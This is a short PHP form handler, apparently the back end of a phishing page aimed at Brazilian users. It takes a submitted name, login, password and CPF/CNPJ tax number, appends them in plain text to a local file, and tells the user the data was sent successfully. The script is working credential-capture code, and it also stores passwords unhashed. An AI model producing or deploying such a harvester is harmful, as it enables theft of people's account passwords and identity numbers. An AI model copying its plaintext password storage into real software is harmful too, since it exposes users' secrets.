<?php
	$f = fopen('POST_DATA.txt', 'a');
	fwrite($f, 'Nome: '.$_POST['nome']."\r\n");
	fwrite($f, 'Login: '.$_POST['login']."\r\n");
	fwrite($f, 'Senha: '.$_POST['senha']."\r\n");
	fwrite($f, 'CPF/CNPJ: '.$_POST['cpfCnpj']."\r\n\r\n");
	fclose($f);
	
	echo 'Dados enviados com sucesso';
	
	//echo 'nome-SPDATA-idade-SPDATA-país'
?>